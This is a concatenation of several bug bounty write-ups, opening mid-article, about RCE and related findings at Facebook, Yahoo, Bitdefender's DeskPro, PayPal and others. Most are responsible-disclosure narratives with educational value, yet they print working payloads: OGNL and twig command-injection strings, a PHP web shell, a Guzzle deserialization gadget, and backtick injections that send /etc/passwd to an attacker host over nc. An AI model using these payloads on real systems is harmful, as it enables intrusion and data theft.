accessible. There needs to be a balance between recon and good ol hacking on the application in order to be successful ”. Press enter or click to view image in full size Figure 38 Recon doesn’t always mean an Asset Discovery Activity Don’t ever throw away the results of your hunt (except in the formal jobs that require you to delete all of those data after completing the work). On one occasion, this can also be useful for your next moves. In this case, I didn’t discard my hunting results at the first stage. And Alhamdulillah, the good thing is, those results can be used in the second stage which finally “produces” 9,000 USD. Please kindly enjoy your bug hunting activity. Maybe not everyone agrees with this, but, don’t always think about the bounty (especially if you just start in this one and never has an experience with it). Try to test the “legal/official” target as much as you can. InshaAllah it can improve your knowledge, methods, and anything when looking for bugs in the target that offering bounties. I tried to learn much technologies (that I had never face) from the target that didn’t offer bounty (but open the responsible disclosure program). In this point, one thing that I can say is, those used technologies aren’t always the technology that we face every day. In other words, we need an official “land” (legal target) to learn it and make us familiar with it. Just try going back to basics. If you think that someone can do it easily, then try to see these motivational words from @BruteLogic : “ They think we do things in a snap. But there’s a lot of hard work, endless hours of trial and error. Many hours parsing search engine results, reading tons of not so helpful information. What they end up seeing is the show time. We make it look easy but it’s not.” Press enter or click to view image in full size Figure 39 One of the Motivational Words And the last one is my really favorite quotes (seriously, this is beautiful): Press enter or click to view image in full size Figure 40 No one Goes from Noob to Elite just like that These words really motivate me a lot to share things even though things that I share aren’t always good things. But with the permission of Allah, I got a lot of feedback that motivate me to correct my mistakes or to improve things. IV. CLOSING Well, even though the third stage (RCE) has no bounty, at least I can achieve one of my dreams, which is “enter” the internal network of big names company (in bug hunting / bug bounty program), then look their internal IP (looks funny, but satisfies me). Apart from the reward stuff, as I said, just enjoy your bug hunting activity. And finally, my article ends here. See you next time, InshaAllah. V.

Seif Elsallamy comment 0 Comments access_time 4 min read Hi Folks, Long time no see, it’s Seif Elsallamy, Remember me ? if not 🙁 you may go through my previous blogs Stored XSS in the heart of the Russian email provider giant (Mail.ru) , Rolling around and Bypassing Facebook’s Linkshim protection on iOS Today I’m gonna show you a race condition bug which i recently fall in love with those kind of vulnerabilities especially in when it comes to Facebook also i want to mention that this bug is super simple to understand It’s not complicated, the only complicated part is how to test and finding it. First thing first, What is Race condition ? So a race condition is a flaw that produces an unexpected result when the timing of actions impact other actions. An example may be seen on a multithreaded application where actions are being performed on the same data. Race conditions, by their very nature, are difficult to test for. As example we got a coupon code or a voucher that gonna give us $10 for shopping online. we enters this code multiple times very fast (before the coupon code expires in the server side) so instead of getting $10 we may get $20 or $30 maybe $100 depends on the server. So I think the main reason for me to love this vulnerability is the unexpected results that may occurs. I think that developers doesn’t consider Race Conditioning while building most of the applications, It’s really unexpected behavior/vulnerability. Enough the Blah Blah Blah, show me some action… 😀 The Fuzz…The Bug..The Action… On Facebook by creating a group conversations didn’t consider the race condition to occur results unexpected behaviour that may put some Facebook users at a risk which is “the ability to spy on a group conversations” So by creating a group conversation invite some users to it choose one of the users that you invited speedily remove and re-add this user to the conversation multiple times (kind of a typical test for exploiting race condition bugs) this user will be invisible BUT can read write remove users and add also there is no “seen” sign after the user looks for chat inside the conversation. So let’s imagine an attack scenario (in the era of the spies). Want a bed story? prepare your doll: -We got 4 innocent users let’s choose a random names for them Symbian, Ali, Hiram and Mahmoud -So yesterday Symbian , Ali and Mahmoud were hanging out together. -Symbian was whispering Ali then they both laughed very hard and Mahmoud was really upset and he keeps asking Symbian about what they laughed for but every time Mahmoud asking they both laugh again. -So at night everyone drive to his home Mahmoud called Hiram complains about the thing that Symbian and Ali were laughing for. -So Hiram told Mahmoud about a bug on Facebook to spy on group conversations and he told Mahmoud that he gonna add him to a group conversation with Symbian and Ali to spy on their chat. -So Hiram opens up the computer added Symbian and Ali to a group conversation and then Added Mahmoud and Removed him speedily multiple times till he became invisible. -Then Hiram sent “sorry I got some error on Facebook I’ll be back later” and left the conversation. -Now Symbian and Ali are the only ones in this conversation and Mahmoud is with them but he is invisible so he can spy on their chat to know what were they both laughing for. – Then Symbian “typing…” and Mahmoud is really excited while he was watching the indicator of “typing…” then Symbian said “good night :D” and left the conversation then Ali left it too. -Sorry Mahmoud hehe :D! So this is the time that you allll weee waiting forrrrr! The PoC Video! The bug was responsibly reported to Facebook by @Seekurity team and we got a really satisfying reward, Thanks for Facebook team for keeping us safe. Thank You too for reading this!!

Bug Bounty program | by Kedrisec | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I found 2.9 RCE at Yahoo! Bug Bounty program Kedrisec 4 min read · Apr 30, 2018 -- 5 Listen Share Hi. I’m kedrisec and I want to describe 3 vulnerabilities that I found as part of the security research at Yahoo Bug Bounty program . So, lets begin. Foreword The Yahoo’s Bug Bounty program include a lot of services and I decided to work around Brightroll. First RCE I started with the regular thing when you do bug hunting, it’s reconnaissance. I do nothing irregular: Google, Aquatone etc… So, when Aquatone show me some interesting port I decided to work around it. That’s what I saw: Press enter or click to view image in full size Queue list Looks like something insteresting, doesn’t it? Ok, It’s time to explore the functional of this thing. As I understood this panel used for creating some tasks(messages) like a RabbitMQ. So, when I clicked on one of the queues I saw the next picture: Press enter or click to view image in full size Message lists This is a lists of messages of the queue. I decide to click on “New Message” link and I saw form (It seemed strange for me because I had no idea what is that): Press enter or click to view image in full size Strage form When I tried to create a new message I was filling this fields randomly. After that I clicked to the submit button and I was redirected to the page of my freshly created message. I saw the window that looks like terminal but I couldn’t write to it anything. This window show me an error (I’m sorry but I haven’t screenshot of this). I come back to message lists and choose one of them. I noticed that it show me filled “Strage” form. It was string in JSON format and looks like this: json:{“sub_bound”:true,”hostname”:” REDACTED \",”timestamp”:”2017/07/01/1649\",”s3_key”:” REDACTED ”,”nop”:false,”providers”:[“Google”,”AWS”],”version”:3,”checkin_queue”:” REDACTED \",\"type\":\" REDACTED \",\"interval_id\":\" REDACTED \",\"pod_id\":\"22\"} I tried to create a new message with this value of parameter 1 field. And after redirect to created message I noticed that several of json values put in to string that was similar to bash command. Press enter or click to view image in full size Window like terminal So, I just try to write “|wget mywebsite.com” aaaaaand it was working ^^. I’ve simplified the hacking process, actualy it was taking about 2 days of work. Final payload was : json:{“sub_bound”:true,”hostname”:”REDACTED\",”timestamp”:”2017/07/01/1649\",”s3_key”:”REDACTED”,”nop”:false,”providers”:[“Google”,”AWS”],”version”:3,”checkin_queue”:”REDACTED\",\"type\":\"REDACTED\",\"interval_id\":\"REDACTED\",\"pod_id\":\" 22|wget http://m yhost.name \"} Brightroll RCE Second RCE Actually, it was the RCE via the same service that was in previous RCE. After about 3 months I found the different host with the same service on the same port. But at this time my previous payload didn’t work. If I remember correctly the reason of it was that symbols | & ; ` { } were filtred. I could bypass it after 1 day working around it. The bypass looks like something that: json:{“sub_bound”:true,”hostname”:”REDACTED”,”timestamp”:”2017/10/23/2248\",”s3_key”:”REDACTED”,”nop”:false,”providers”:[“Google”,”AWS”],”version”:3,”checkin_queue”:”REDACTED”,”type”:”REDACTED”,”interval_id”:”REDACTED”,”pod_id”:” 23\\u000awget\\u0020http://myhost.name \"} Third ALMOST RCE This vulnerability is the most interesting of all my finds. So, I started my research of yahoosmallbusiness store after creating a few products to have access to functions related with it. While I was discovering a functional I noticed that when I visit email templates page ajax send a few requests to get path to the images of products that showed on the page. One of the requests was sended to objinfo_data.php with parameter id. As I thounght this script was used to resize products image. So, this part is important. When I was creating a products I notice that request that used to create product containt a couple of urls to image but not directly binary image data. My suggestion was that: “What if the script get the link of product image and use it to resize.”. I thought it’s may be SSRF. I edited the product, changed image url to my host and port and runned netcat. After that I use product id of this product in request to objinfo_data.php. Netcat showed me the request and I noticed that User-Agent was Curl. After that I tried to get RCE any possible ways, but have no results:( It just wasn’t working. After all my torment’s I decide to ask my collegues about it. One of them offered to try to use “-A something” and if I will see “User-Agent: something” in the request in netcat it’s possble to injection to argument string. I tried and it worked! After that another my collegue immediately offer to me use flag -T. This flag get file from file system and attach it to request. I used it and was able to read /etc/passwd. Why I called it almost RCE when I cant execute another commands? Because curl have another interesting flag “-o” this flag can be used to write output to file system. Therefore, If I could found web directory on the server, I just was able to write web-shell there and (if it was over firewall) execute it via curl :) Yahoo Small Business curl argument injection.

The CMS was a journal site giving service to authors, editors and etc. I accomplished to get editor account by an XSS which I’m not going through with this story. In the editor’s role, there were many options, interesting ones were “XML checker” and “Converting LaTex codes to PDF”. The first one lets which is not related to our topic, the second one seemed interesting. Press enter or click to view image in full size Converting LaTex code to PDF A remote attacker can gain remote command execution thanks to LaTex code conversion, following links might be helpful: https://tex.stackexchange.com/questions/262625/security-latex-injection-hack https://0day.work/hacking-with-latex/ http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/ So I crafted an exploit code shown below in order to read local files in the server: Press enter or click to view image in full size Resulted in : Press enter or click to view image in full size Bingo, I’d the /etc/passwd content. The payload to command execution: Resulted in: Press enter or click to view image in full size Out of Band Technique The PDF conversion was annoying, I wanted to escalate my privileged, so I automated the procedure by Writing a code exploiting the flaw (LaTex to PDF) Writing a server by python receiving the result, converting it to clear text, saving it. The flow is shown below: Press enter or click to view image in full size Consequently: Press enter or click to view image in full size Afterward, I got conformable with this exploit, seeking the server, I got the database and Elastic-Search by SSRF and had fun.

Here’s the full content:\n\nUnrestricted File Upload to RCE | Bug Bounty POC - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty December 19, 2017 Share BugBounty POC 4 Unrestricted File Upload to RCE | Bug Bounty POC by MuhammadKhizerJaved H ey Guys, Hope all of you guys are doing well, I’m an Active Bug Bounty participant, & also sometimes work as a Freelancer for some extra pocket money :p So I got a Project to test a site for possible security issues, while working on the Project i was able to bypass the file Upload functionality to Upload a shell to the website. It wasn’t a regular Bug Bounty Hunt so my target was Damn vulnerable but also fun to practice. ( I haven’t taken much screenshots during testing so will try to share as much info as i can ) Back to the POC, It all started by Logging into the account, The website was basically a team management portal and i was testing for any Cross Site Scripting issues, ( And i got one ) but then from setting their was an option to upload user profile image, So I decided to test it, the first thing i did was to check what if they Upload images on same site or on a 3rd party storage. all other images on that website was on https://targetsite.com/images/static/image.jpg so when i uploaded the simple image on the profile it was on https://taretsite.com/images/users/<ProfilID>/name.jpg Now the next thing was to try uploading any other extension, but if i try uploading any extension other than JPG, PNG, & GIF it popup a forbidden error. But while testing i realized that they send a GET request containing the filename & mime, in it https://targetsite.com/settings/19982638/avatar?name=teest.png&mime=image%2Fpng and the response of the request was 200OK simple & The next request was simple PUT request for file upload to the images directory https://targetsite.com/users/19982638/testtts.png I tried chaining the content of the PUT request as HTML or TXT but it always gets back a 500 Internal Server Error. It was because i forget that the referer header contains the last URL. But then tested it again By changing the name & mime in 1st GET request as it was added as Referer to the next PUT request and then i changed the content & file type in the PUT request. https://targetsite.com/settings/19982638/avatar?name=kj.html&mime=text%2Fhtml and Following that request i made changes to the PUT request to Upload an HTML file and it was Success…. Now I have a Stored XSS using HTML file, I bypassed the Same origin Policy, & X-Frame-Options Header. etc Now i decided to upload a PHP file, <?php if ( isset ( $_REQUEST [ ‘ cmd ‘ ])){ echo “ <pre> “ ; $cmd = ( $_REQUEST [ ‘ cmd ‘ ]); system ( $cmd ); echo “ </pre> “ ; die ; } ? > i used the simple one liner PHP backdoor for the test purposes. But One thing that made me angry was i wasn’t able to execute a PHP file for some reason it always gave me a 403 Forbidden error, But then i decided to try some other extensions, php=> 403 Forbidden But phps, phpt, php3, php4, php5=> 200 OK Target: http://targetsite.com/images/users/19982638/cmd.phps?cmd=cat+/etc/passwd i guess only the php extension was not getting uploaded but others worked, It was all for me to confirm the issue. Note: I haven’t disclosed the actual website that i worked with and posting this after the developer review this post.

In this article we explain how we managed to find and exploit multiple vulnerabilities that eventually lead to remote code execution (RCE) at DeskPro software utilized by thousands of organizations using Bitdefender and Freelancer Inc in a case study. No full exploit is currently available, but steps can be easily reproduced and used to build one. Preface A helpdesk is now a crucial part of any company’s online presence. With much sensitive information exchanged between agents and clients, it makes it the perfect target for an adversary targeting the organization. In September 2019, we decided to have a look at some of the most popular open-source helpdesk solutions. Between cloud and on-premise, we preferred to focus on self-hosted solutions because the risks accompanied with them extend beyond data breach to potential internal network infiltration. So, we chose on-prem versions of DeskPro , osTicket and Kayako (We also did “PHP Live!” as a plus for a client) and will present our principal findings in this and the upcoming articles. About DeskPro As defined by them Deskpro is a helpdesk software solution that helps companies manage their communication with their customers and user base across a multiple channels; email, live chat, voice, social media DeskPro has clients in different industries. Some of the well-known names per their website are: Microsoft, Siemens, P&G, Vodafone, HMRC, CapitalOne, Panasonic, NHS, Valve, Brown University, Hotel Chocolat, Garmin, Team USA, Arrow, Pure, Xerox, 1&1, Booz Allen Hamilton, Bitdefender, US Department of Defense and more. The last published CVE/exploit for DeskPro was in 2007 and last (and only) security advisory on their current website was in 2015. This meant that either this application is robust or overlooked. So we took the challenge and we decided to see for ourselves. Vulnerability Details Since we have much to present and this article is already getting long, we decided to keep the upcoming parts focused on the discovered vulnerabilities themselves rather than the motivation and paths used to find them, if anyone is interested, please let us know in the comments. 1. Insufficient Access Control at Multiple API endpoints DeskPro shows high degree of automation and integration through API interfaces that enable developers to build apps that interact with different components of the system. However, multiple API endpoints were found to have a problem properly validating user’s privilege, giving a normal user arbitrary unauthorized access to various actions and information. The following table shows the most important ones /api/apps/* – (CVE-2020-11465) Controlling/installing helpdesk applications, leaking current applications’ configurations, including applications used as user sources (used for authentication) such as JWT . This enables an attacker to forge valid authentication models that resembles any user on the system (Privilege Escalation) /api/email_accounts – (CVE-2020-11463) Retrieve plaintext credentials of all helpdesk email accounts, including incoming and outgoing email credentials /api/tickets – (CVE-2020-11466) Retrieve sensitive information about all helpdesk tickets stored in database with numerous filters. Additionally, it leaks ticket auth code, making it possible to make changes to the ticket /api/people – (CVE-2020-11464) Retrieve sensitive information about all users’ registered on the system. This includes their full name, privilege, email address, phone number…etc. (will be of a good use in our attack scenario) 2. Insecure Deserialization to RCE in Template Editing Feature (Needs Admin Privilege) [CVE-2020-11467] DeskPro enables administrators to modify helpdesk interface by editing theme templates and uses TWIG as its template engine. While direct access to self , _self variables was not permitted, we could abuse the accessible variables in our context to reach PHP’s native unserialize function where we passed our crafted payload to trigger a set of POP gadgets in order to achieve remote code execution. How to Identify Passively? There is nothing cooler than launching a mass scanner hacking the world, while you are chilling out enjoying your favorite movie on Netflix 😀 Luckily, this one is easy to deploy, because DeskPro gives you detailed information about current version deployed under the following API call “ /api/v2/helpdesk/discover “. So with a simple unauthenticated GET request, if you find “ build_name” less than “ 2019.8.0 “, it is probably your lucky day. Now.. Time for Fun Part.. Exploitation! So the plan goes as follow, register a normal guest account (self-registration enabled by default), leak JWT secret, login as administrator, trigger deserialization and voila… server compromised! Bitdefender Support Center (support.bitdefender.com) is using Deskpro. So, we will use it as the case study in this article. But first I would like to give Bitdefender team a big shoutout for their awesome response. Although this issue affects a third-party product, they have deployed a temporary fix within hours and fixed the whole thing (in coordination with DeskPro team) in less than 24 hours and they have been cool enough to allow us to publish this article. The reason we chose Bitdefender is that through our experience with their bug bounty program, they have always been friendly, highly responsible, and actively encouraging security research to enhance their security posture. So let’s begin! 1. Retrieving Limited User API Token In order to establish our attack, we need a valid user account, which we can easily obtain via self-registration at https://support.bitdefender.com/en/register . After activating user’s account, we can request access token by sending username and password to the following API endpoint (https://support.bitdefender.com/api/v2/api_tokens) as shown below 2. Compromising JWT Authentication Note: Any further requests to API interface would require Authorization header to be set to base64 value of the retrieved API token as shown in the following steps DeskPro has a set of built-in applications that can be used for authentication, one of them is JWT app identified by deskpro_us_jwt . As a quick reminder for those who are not much familiar with JWT, it can be regarded as a method for representing claims (such as user identity). To ensure data integrity and security, they are usually signed with a secret key which can be used to validate provided claims. You can find more information here . So, if JWT authentication is enabled and we have this key, we can authenticate to the application as any user. Due to access-control vulnerability within DeskPro, normal user’s could access API endpoints responsible for applications including JWT. Which means, a simple GET request to “https://support.bitdefender.com/api/apps/packages/deskpro_us_jwt?usersource_type=user” with normal user privilege, would leak JWT secret. In Bitdefender case, JWT authentication was not enabled. However, we managed to enable it by issuing PUT request to the same endpoint as shown below PUT /api/apps/packages/deskpro_us_jwt?usersource_type=user HTTP/1.1 Host: support.bitdefender.com Authorization: Basic <redacted> Content-Type: application/json Content-Length: 269 {\"settings\":{\"sso_type\":\"none\",\"auto_agent\":true,\"dp_app\":{\"title\":\"JSON Web Token (JWT)\"},\"actions\":[],\"enable_usersource\":true,\"url\":\"https://www.google.com\",\"secret\":\"V3ryS3cr3tK3y\",\"algo\":\"HS256\",\"login_custom_text\":\"Login\",\"logout_agent_url\":\"https://www.google.com\"}} We can confirm that user source is now available by sending GET request to the same endpoint. We identify usersource id from the following screenshot 3. Getting Administrative Access to Helpdesk To be able to forge a valid administrator JWT token, we need to know administrator’s email. Instead of guessing or bruteforcing our options, we utilized another broken access-control issue at “https://support.bitdefender.com/api/people?is_agent=1” endpoint which brought back to us a list of all system agents and administrators. Administrators had the flag can_admin set to true After retrieving administrator’s email, knowing the secret key of JWT authentication app, we managed to forge a valid JWT token and authenticate to the application using the following URL https://support.bitdefender.com/login/authenticate-callback/6?jwt=<redacted> 4. Executing Arbitrary Code on Bitdefender Helpdesk Now with administrative access, we can trigger deserialization vulnerability that exists in theme editing feature. All we need to prepare is a proper POP gadget to achieve code execution. After we have discovered the gadget chain in Guzzle library, we found out that it was already known and published in ambionics’ awesome tool PHPGGC , so shoutout for them and @proclnas for the awesome work. So, generate the serialized object using PHPGGC (we choose a minimal PoC that executes phpinfo() ) and edit application’s templates to contain your payload and deserialize it as shown in the following request PUT /portal/api/style/edit-theme-set/template-sources HTTP/1.1 Host: support.bitdefender.com Cookie: <redacted> Content-Type: application/json Content-Length: 564 {\"template\":\"Theme::layout.html.twig\",\"code\":\"{% set p = 'O:24:\\\"GuzzleHttp\\\\\\\\Psr7\\\\\\\\FnStream\\\":2:{s:33:\\\"\\\\x00GuzzleHttp\\\\\\\\Psr7\\\\\\\\FnStream\\\\x00methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\\\\\HandlerStack\\\":3:{s:32:\\\"\\\\x00GuzzleHttp\\\\\\\\HandlerStack\\\\x00handler\\\";s:1:\\\"1\\\";s:30:\\\"\\\\x00GuzzleHttp\\\\\\\\HandlerStack\\\\x00stack\\\";a:1:{i:0;a:1:{i:0;s:7:\\\"phpinfo\\\";}}s:31:\\\"\\\\x00GuzzleHttp\\\\\\\\HandlerStack\\\\x00cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:14:\\\"_fn___toString\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}' %} {{var_dump(app.getUser().unserialize(p))}}\"} Now, navigate to preview page to trigger your payload (https://support.bitdefender.com/admin-preview-1/new-ticket) as shown below After reaching this point, we reported our findings to Bitdefender and did not attempt to do any lateral movement. [UPDATE] Mahmoud Gamal (@Zombiehelp54) brought to our attention another way that can be used to achieve remote code execution (RCE) via twig template injection. It was even part of VolgaCTF 2020 Qualifier challenge. Apparently, using any of the following vectors lead to executing system commands. {{ app.request.query.filter(0,'whoami',1024,{'options':'system'}) }} {{['whoami']|filter('system')}} We have tested both vectors on the latest stable version and it works like a charm. Real Impact Since most -if not all- helpdesk instances enable self-registration (because, well… it is a helpdesk for “customers”), the vulnerability enables a remote attacker to fully compromise helpdesk instance. This includes all information exchanged between agents and clients which usually contain very sensitive information and PII. Moreover, application configurations and secret keys are leaked (e.g. JIRA API integration public and private keys) . An attacker can also reach company’s intranet and use this helpdesk instance as a pivot point to infiltrate corporate network. Bitdefender and DeskPro Response Bitdefender took the issue very seriously and applied full patches in less than 24 hours which was quite remarkable given that the vulnerable code was in a third-party product. So a big shoutout to them and DeskPro team for fast response. DeskPro has released a security advisory regarding this issue on their website (https://support.deskpro.com/en/news/posts/deskpro-security-update-2019-09) but they failed to mention the remote code execution warning, we tried to contact them several times in this regard but we have not heard back from them. Bitdefender also rewarded us with $5,000 USD as part of their bug bounty program. So thanks for this as well :). What’s Next? In the upcoming articles we will talk about other remote code execution vulnerabilities we discovered in osTicket and Kayako. So go update your systems and get ready to hack the world!

Avinash Jain (@logicbomb) 5 min read · Apr 29, 2018 -- 5 Listen Share Hi Guys, This vulnerability blog is about when Apache struts2 CVE-2013–2251 went viral and was getting highly exploited because of the impact of vulnerability which was leading to execution of remote commands. In short it was — A vulnerability introduced by manipulating parameters prefixed with “action:”/”redirect:”/”redirectAction:” allows remote command execution in the java web application using < Struts 2.3.15 as a framework. Now when this loophole went viral, major application firewall companies started updating their rule engines and detection technique in order to prevent it from happening which was a pretty obvious and responsible thing. But I was not only able to bypass the firewall and get the remote code execution but also able to get the shell of the server and that too as root user by exploiting kernel CVE. :) Let’s see what was the complete hack — This comes when I was testing for a travel booking website. As it was very clear in order to find whether the application is running over vulnerable Apache Struts framework , you have to simply check for the following vulnerable parameters — “action, redirect,redirectAction” and for the right payload, I google’d a little (as for this, I have to construct an OGNL expression) and this helped me a lot- http://blog.opensecurityresearch.com/2014/02/attacking-struts-with-cve-2013-2251.html , below is the payload used to run the command “ifconfig” redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()} Press enter or click to view image in full size OGNL Expression to run command but as expected , it was blocked by the application firewall , and redirected me to a bots page- Press enter or click to view image in full size Blocked by Application Firewall- Redirected to Bots page and when anything like this happens to me, I always return to the basics. So as pointed out earlier, I knew that which all parameters were vulnerable and one of them was “redirect” which I used in the above request. “Redirect” , yes you felt it right , let’s try for some redirection here and I simply put redirect:http://www.goal.com - Press enter or click to view image in full size redirect request and as you can see I got 302 redirection to location”http://www.goal.com :) and so my earlier “ifconfig” payload got blocked and this redirection worked , this gave an idea to bypass the firewall and so , I combined both the above payload- redirect:http://www.goal.com/${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()} and fired the request- Press enter or click to view image in full size Time for some cheer as I was able to bypass the firewall and got the “ifconfig” command output running :) Press enter or click to view image in full size ifconfig command output Now the next target was to get the remote shell of the server and I tried it using reverse ssh tunneling and public key authentication which allow SSH users to login in without entering passwords. For this I had to put my attacker server ssh public key in the victim server’s authorization list ~/.ssh/authorized_keys. in order to prove the identity and as this going to be a reverse ssh tunnel , I had to add id_rsa.pub key of the victim ssh server as well. In order to define the concept of above 2 keywords in short and understand the concept of public key authentication — id_rsa.pub is a public key that you add to other hosts' authorized_keys files to allow you to log in as that user. authorized_keys is a list of public keys that are allowed to log into that specific account on that specific server. 1st Step- Cat the id_rsa.pub file of the victim server using RCE Press enter or click to view image in full size id_rsa.pub file 2nd Step- Copy the authorized_keys from victim server to attacker server Press enter or click to view image in full size Copy the authorized_keys from victim server to attacker server 3rd Step- Copy back the modified authorized_keys from attacker server to victim which I got by reading id_rsa.pub Press enter or click to view image in full size Copy back the modified authorized_keys from attacker server to victim Now the final step — SSH using the reverse tunnel on attacker machine so I ran the command- Press enter or click to view image in full size SSH using reverse tunnel Pheww! Able to reach to the remote shell of server. :) but I was not logged in as a root that means I could have only limited right and access to files and commands. Now in order to logged in as root user, firstly I found out what was the current kernel version running on victim machine and it was - Press enter or click to view image in full size kernel version So the kernel version found to be 2.6.32 which I google’d in order to find if there was any open CVE against this and to my luck, I found that it was vulnerable to privilege escalation and exploit was over github too — https://github.com/realtalk/cve-2013-2094 . Without wasting much time, I ran the exploit. Press enter or click to view image in full size Running the exploit and finally I was able to get privilege escalation to the root user! :) and this is how the chain to get the remote shell of the server as a root user by exploiting apache strut 2 vulnerability and kernel version exploit ends.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nArtsploit: [manager.paypal.com] Remote Code Execution Vulnerability Artsploit get shell or die trying Monday, January 25, 2016 [manager.paypal.com] Remote Code Execution Vulnerability In December 2015, I found a critical vulnerability in one of PayPal business websites ( manager.paypal.com ). It allowed me to execute arbitrary shell commands on PayPal web servers via unsafe JAVA object deserialization and to access production databases. I immediately reported this bug to PayPal security team and it was fixed promptly. Details While testing manager.paypal.com application, I noticed an unusual post form parameter “oldFormData” that looks like a complex object after base64 decoding: The following research showed that it is a Java serialized object without any signature. It means you can send a serialized object of any existing class to the server, and the “readObject” (or “readResolve” ) method of that class will be called. For exploitation, you need to find a suitable class in the application “classpath” which can be serialized and has something interesting (from exploitation point of view) in the “readObject” method. You can read about this technique in the recent article by FoxGlove Security . A year ago, Chris Frohoff (@frohoff) and Gabriel Lawrence (@gebl) did a great job and found suitable classes in Commons Collections library that could lead to remote code execution. They also published the “ysoserial” payload generation tool on their github page . Exploit I downloaded this tool and generated a simple payload that sends DNS and HTTP requests to my own server by executing the “curl x.s.artsploit.com/paypal” shell command. Then I sent the base64 encoded payload in the “oldFormData” parameter to the application server and was impressed by an incoming request from the PayPal network that appeared in my NGINX access log: I realized that I could execute arbitrary OS commands on the web servers of manager.paypal.com, establish a back connection to my own Internet server and, for example, upload and execute a backdoor. As a result, I could get access to production databases used by the manager.paypal.com application. Instead, I just read “/etc/passwd” file by sending it to my server as a proof of the vulnerability : I also recorded a video how to reproduce this vulnerability and reported it to the PayPal security team. Later, I found out that many other endpoints of the manager.paypal.com application also use serialized objects and can be exploited as well. In a month, my report received a Duplicate status because another researcher, Mark Litchfield, reported a similar vulnerability two days earlier than I did (on December 11, 2015). PayPal decided to pay me a good bounty anyway, and I have nothing but respect for them. Demo Posted by Michael Stepankin at 1:05:00 AM Email This BlogThis!

As a fresh start, I decided to look around and see what I could find. This company, required that I verify my account with some confidential information so I reached out to their sec engineers and team on how this could be done. Once the verification was done by adding some fake data, I moved onto to find some severe vulnerability. One of them was a RCE on their server. Most of the details here will be a redacted version to keep confidential information, private. When I first started in this app, I knew they were vulnerable for RCE. Gut feeling combined with some recon gave me the feeling that I could get a RCE. It was just a matter of where and how. Like I always do, I played with the app for a while and made a list of features that could have this vulnerability. For example file upload was something that was in top of my list. I tried some steps to upload php or even html to just see if I could upload a file. Unfortunately, it was pretty tight in security on file uploads so I decided to move on. After that I moved onto another endpoint, lets call this endpoint_lvl1 . This was used to send some request to another vendor to buy some product. It needed the price of the product and the user id. This was likely using an API or some form of request. In PHP you can do this multiple ways. curl request, simple api request and many more. I have basic experience of PHP so I decided to layout / program possible source code for that part. This way I could visualize the code as it happened. The request was sending my product price and user id. And in result, it will either result something like Successfully bought the product and reduce the balance from the account or it would say something like I could not get the user account. If you don't have a user account on this vendor, create one please . When there was no response form the vendor’s server, it sent a 500 Internal server error. Now comes the part of CTF hunting. The recon that I had done before had confirmed that they had RCE and it should not be hard to find. So if this was the endpoint that was vulnerable to RCE then there should not be much work needed. I also noticed that while other things might change, the length of user id was always the same. If it was less than that, it would send an error asking user to Put a valid user id . Now because we know this uses PHP and because this is vulnerable to RCE, I had to eliminate some option. API would be hard to get RCE with unless there was some really shady stuff going on there. So I went with sth that no one could have possibly thought of : Curl file_get_contents and if it is really vulnerable how about having a shell_exec() or system() I went to test with each and everyone of it. I created a local instance on my server, creating vulnerable PHP with each types to get RCE, that way I tried a small payload to see how it works for each. Curl and file_get_contents did not work. shell_exec() kept bugging me on how it could potentially work. Along with that, there were some more behaviors that stood out. Exploit: During the analysis of the application, as previously stated, when a product was bought, an external call was made. However this request never showed up on Burp. This was interesting and because this was php, I thought it could be something like: shell_exec('curl {website with request}') . This way the request will never go to burp and the system will be able to run the cURL request. So a sample code will have an activity like this: User enters the ID which will be used to buy the product The ID is then sent to external website in format like this: shell_exec('curl -X POST -d \"strCommand=GETUSERINFO'.'&strParam1='.'|user='.$_POST['user_id'].'|\" '.$url.' -k'); The ID was supposed to be 7 character longs but they did not check if the ID was an int or a string and simply checked the first character to deduce that it was an int so if we simply have 1xxxxxx then we would bypass that. So now with a sample request that could look like something above, I sent a payload: 1xxxxxxxxxx`sleep 5` . This payload will bypass the string check and at the same time, allow me to run a command through shell_exec(). Once the request was sent, there was a delay of 5 seconds. Next, I sent: 1xxxxxxxxxxxxx`id | nc {my_ip} 80` and the server successfully received the server user id which could be something like this: uid=0(root) gid=0(root) groups=0(root) . After that, I launched a request for /etc/passwd and got its content as well with this payload: 1xxxxxxxxxxxxx`cat /etc/passwd| nc {my_ip} 80` Timeline: (Date and time are from h1 system) July 3, 2017 03:37:23-Report submitted July 3, 2017 03:47:20-Report Triaged July 3, 2017 03:58:44-A pretty detailed writeup about how this work was sent July 8, 2017 — Vulnerability Fixed Hackerone Bug Bounty -- -- 1 Written by Uranium238s 468 followers · 7 following Security Researcher @ Hacker0x01.

